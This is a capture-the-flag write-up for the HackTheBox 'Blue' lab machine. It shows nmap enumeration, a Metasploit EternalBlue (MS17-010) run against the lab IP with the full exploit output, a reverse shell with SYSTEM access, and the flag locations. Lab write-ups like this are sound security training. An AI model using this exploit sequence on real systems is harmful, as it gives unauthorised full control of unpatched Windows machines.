---
layout: page
title: HackTheBox Blue
---

### Enumeration 
First I do an nmap scan ```nmap -sC -sV -oA scan 10.10.10.40```. Here's what it outputs:
![nmap scan](https://user-images.githubusercontent.com/41026969/53510149-4d1b2300-3a8b-11e9-86af-d4d14c86671c.PNG)

So doing research on the ports, OS versions, SMB version, and potential exploits, I found out about [EternalBlue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue). Here's the link for the Microsoft webpage explanation [here](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/MS17-010). Cross checking, I see this machine can be used using Eternalblue (and thus the name of this box). 

### Exploitation

So for this exploit we'll use the metasploit module: ```exploit/windows/smb/ms17_010_eternalblue```

Opening up metasploit and setting up the module:

![blue](https://user-images.githubusercontent.com/41026969/54173251-925e2e00-4457-11e9-8de9-4d9263560d9d.PNG)

Also we see that the RHOST (remote host) is currently set to nothing so I set it to 10.10.10.40 (the IP of the box).

When we run the exploit, we successfully get a shell inside the box:
```
msf exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on [host ip]
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened ([host ip] -> 10.10.10.40:49158) at 2019-03-11 23:41:30 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Doing a ```whoami``` check confirms we got basically administrator access (```nt authority\system``` has the highest priviledges on the local system).

Thus we find the flags:

root: ```C:\Users\Administrator\Desktop\root.txt``` 

user: ```C:\Users\haris\Desktop\user.txt``` 